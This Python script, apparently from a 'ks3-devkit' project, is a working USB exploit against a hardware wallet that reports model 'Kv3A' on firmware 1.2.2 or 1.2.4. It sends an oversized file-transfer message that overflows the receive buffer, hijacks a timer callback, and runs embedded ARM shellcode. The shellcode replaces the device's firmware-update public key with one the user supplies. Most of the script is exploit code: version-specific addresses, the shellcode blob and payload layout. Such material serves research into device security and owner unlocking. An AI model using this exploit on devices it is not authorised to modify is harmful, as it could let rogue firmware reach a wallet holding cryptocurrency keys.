# Part of ks3-devkit
# MIT license
# Nicolas Bacca, 2024

import usb
import binascii
import struct
import os
import sys

BLOCK_SIZE = 64


HEADER_PROTOCOL = 0x6b
PROTOCOL_VERSION = 0
PROTOCOL_INDEX = 0
PROTOCOL_FLAG = 1
SERVICE_ID_DEVICE_INFO = 1
COMMAND_ID_DEVICE_INFO_BASIC = 1
SERVICE_ID_FILE_TRANS = 2
COMMAND_ID_FILE_TRANS_INFO = 1
COMMAND_ID_FILE_TRANS_CONTENT = 2
COMMAND_ID_FILE_TRANS_COMPLETE = 3
TAG_DEVICE_MODEL = 1
TAG_DEVICE_SERIAL_NUMBER = 2
TAG_DEVICE_HARDWARE_VERSION = 3
TAG_DEVICE_FIRMWARE_VERSION = 4
TAG_FILE_NAME = 1
TAG_FILE_SIZE = 2
TAG_FILE_MD5 = 3
TAG_FILE_SIGNATURE = 4
TAG_FILE_OFFSET = 1
TAG_FILE_DATA = 2
TAG_ACK = 0xff
TAG_FILE_CONTENT_ACK = 3 

MD5_160 = binascii.unhexlify("997335c1ac2aab2332e8838e57c6715e")
MD5_SIGNATURE_160 = binascii.unhexlify("237b6dd35e1fee70113bbd6919e42f0e551a7508ab141a6fd95e770e9f837050436834b437805bb68787b147cac5abad2e2c995ee0af759119be8f6eba182d11")

SHELL = binascii.unhexlify("00b583b00b480c4b984700280cd101ab4f221a70043a5a7001aa0023937007490748084b9847fee701ab4b221a7004325a70f1e7945a082061980901ffff0000fc484f01a5590901")

OBJS_122 = {
	'g_protocolRcvBuffer' : 0x20085988,
	'openSans_20' : 0x014f48fc,	
	'PrintOnLcd' : 0x010959a4, 
	'SetUpdatePubKey' : 0x01099860 
}

OBJS_124 = {
        'g_protocolRcvBuffer' : 0x200859cc,
        'openSans_20' : 0x014f6568,
        'PrintOnLcd' : 0x0109594c,
        'SetUpdatePubKey' : 0x01099808 
}

OBJS = {
	'1.2.2' : OBJS_122,
	'1.2.4' : OBJS_124 
}

def build_tlv(tag, data):
	result = struct.pack("<B", tag)
	if len(data) > 0x7f:
		result = result + struct.pack("<BB", 0x80 | (len(data) >> 8), len(data) & 0xff)
	else:
		result = result + struct.pack("<B", len(data))
	result = result + data
	return result

def send_data(ep_out, serviceId, commandId, data, sendChecksum=True):
	wire = struct.pack("<BBH", HEADER_PROTOCOL, PROTOCOL_VERSION, PROTOCOL_INDEX) 
	wire = wire + struct.pack("<BB", serviceId, commandId)
	wire = wire + struct.pack(">H", PROTOCOL_FLAG)
	wire = wire + struct.pack("<H", len(data))

	ep_out.write(wire, 64)
	offset = 0 
	while(offset < len(data)):
		chunkSize = BLOCK_SIZE if ((offset + BLOCK_SIZE) < len(data)) else len(data) - offset
		ep_out.write(data[offset : offset + chunkSize], 64)
		offset = offset + chunkSize
	if sendChecksum:
		checksum = struct.pack("<I", binascii.crc32(wire + data))
		ep_out.write(checksum, 64)

def receive_response(ep_in):
	data = bytes(ep_in.read(64))
	if data[0] != HEADER_PROTOCOL:
		raise Exception("Invalid response")
	if len(data) < 10:
		raise Exception("Invalid data length")
	dataSize = struct.unpack("<H", data[8 : 8 + 2])[0]
	response = data
	offset = len(data)
	while offset < dataSize + 4:
		data = bytes(ep_in.read(64))
		response = response + data
		offset = offset + len(data)
	crc = struct.unpack("<I", response[len(response) - 4:])[0]
	if crc != binascii.crc32(response[0 : len(response) - 4]):
		raise Exception("Invalid CRC")
	offset = 10
	result = {}
	while offset < len(response) - 4:
		tag = response[offset]
		offset = offset + 1
		if response[offset] > 0x7f:
			tagLength = ((response[offset] - 0x80) << 8) | response[offset + 1] 
			offset = offset + 2
		else:
			tagLength = response[offset]
			offset = offset + 1
		result[tag] = response[offset : offset + tagLength]
		offset = offset + tagLength	
	return result	

def patchAddress(data, address1, address2):
	address1 = struct.pack("<I", address1)
	address2 = struct.pack("<I", address2)
	if data.find(address1) < 0:
		raise Exception("Pattern not found")
	return data.replace(address1, address2)

if len(sys.argv) < 2:
	print("Usage : " + sys.argv[0] + " hex_uncompressed_public_key")
	sys.exit(1)	

try:
	pubKey = binascii.unhexlify(sys.argv[1])
except:
	print("Invalid public key format")
	sys.exit(1)

if len(pubKey) != 65:
	print("Invalid public key size")
	sys.exit(1)

if pubKey[0] != 0x04:
	print("Invalid public key format") 
	sys.exit(1)

dev = usb.core.find(idVendor=0x1209)

if dev == None:
	print("Device not found")
	sys.exit(1)

cfg = dev[0]
intf=cfg[(0,0)]
ep_out = intf[0]
ep_in = intf[1]

send_data(ep_out, SERVICE_ID_DEVICE_INFO, COMMAND_ID_DEVICE_INFO_BASIC, b"")
response = receive_response(ep_in)
device = response[TAG_DEVICE_MODEL]
device = device[0 : len(device) - 1].decode('utf-8') 
if device != 'Kv3A':
	print("Unknown device model")
	sys.exit(1)
firmwareVersion = response[TAG_DEVICE_FIRMWARE_VERSION]
firmwareVersion = firmwareVersion[0 : len(firmwareVersion) - 1].decode('utf-8')
if not firmwareVersion in OBJS:
	print("Unsupported firmware version " + firmwareVersion)
	sys.exit(1)

OBJ = OBJS[firmwareVersion]
if firmwareVersion != '1.2.2' :
	SHELL = patchAddress(SHELL, OBJS_122['g_protocolRcvBuffer'] + 10 + 2 + 256, OBJ['g_protocolRcvBuffer'] + 10 + 2 + 256)
	SHELL = patchAddress(SHELL, OBJS_122['openSans_20'], OBJ['openSans_20'])
	SHELL = patchAddress(SHELL, OBJS_122['PrintOnLcd'] + 1, OBJ['PrintOnLcd'] + 1)
	SHELL = patchAddress(SHELL, OBJS_122['SetUpdatePubKey'] + 1, OBJ['SetUpdatePubKey'] + 1)

fileSize = 100000

# Padding 
fileData = b"\xab" * 256
# Align
fileData = fileData + b"\xab"
fileData = fileData + b"\xab"
fileData = fileData + pubKey 
# Padding
fileData = fileData + b"\xab" * (512 - 256 - 2 - len(pubKey))  
# Align
fileData = fileData + b"\xab" 
fileData = fileData + b"\xab"
fileData = fileData + SHELL
# Padding
fileData = fileData + b"\xab" * (1024 - 512 - 2 - len(SHELL))
# Align
fileData = fileData + b"\xab"
fileData = fileData + b"\xab"

# Timer_t 

CALLBACK = OBJ['g_protocolRcvBuffer'] + 10 + 2 + 512 + 1

fileData = fileData + b"\x00" * 24 #linked lists
fileData = fileData + struct.pack("<I", 0) #delay
fileData = fileData + struct.pack("<I", 0) #id
fileData = fileData + struct.pack("<I", CALLBACK) #callback
fileData = fileData + struct.pack("<I", 0) #info
fileData = fileData + struct.pack("<I", 0x02)

# Padding
fileData = fileData + b"\x00" * (4500 + 4 + 4 + 4 - 10 - 44 - 1024 - 2)
fileData = fileData + struct.pack("<I", OBJ['g_protocolRcvBuffer'] + 10 + 2 + 1024) # Timer_t 

data = build_tlv(TAG_FILE_NAME, b"dummy.bin")
data += build_tlv(TAG_FILE_SIZE, struct.pack("<I", fileSize))
data += build_tlv(TAG_FILE_MD5, MD5_160)
data += build_tlv(TAG_FILE_SIGNATURE, MD5_SIGNATURE_160) 

send_data(ep_out, SERVICE_ID_FILE_TRANS, COMMAND_ID_FILE_TRANS_INFO, data)
response = receive_response(ep_in)

send_data(ep_out, SERVICE_ID_FILE_TRANS, COMMAND_ID_FILE_TRANS_CONTENT, fileData, False)

input("Press return to continue")
send_data(ep_out, SERVICE_ID_FILE_TRANS, COMMAND_ID_FILE_TRANS_INFO, data)
response = receive_response(ep_in)

